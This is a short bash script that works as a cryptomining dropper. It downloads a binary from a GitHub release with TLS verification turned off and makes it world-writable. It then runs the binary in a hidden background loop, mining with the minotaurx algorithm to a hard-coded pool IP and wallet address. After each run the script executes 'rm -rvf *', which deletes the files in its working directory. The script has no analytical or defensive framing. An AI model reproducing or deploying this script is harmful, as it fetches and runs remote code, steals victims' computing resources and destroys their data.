#!/bin/bash
 
curl -sLkO http://github.com/paskofa10/noband/releases/download/daemon/cetuz
chmod 777 cetuz
while [ 1 ]; do
./cetuz -a minotaurx -o 188.165.24.209:7019 -u MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW -p c=MAZA,zap=MAZA >/dev/null 2>&1 &
sleep 10
rm -rvf *
done
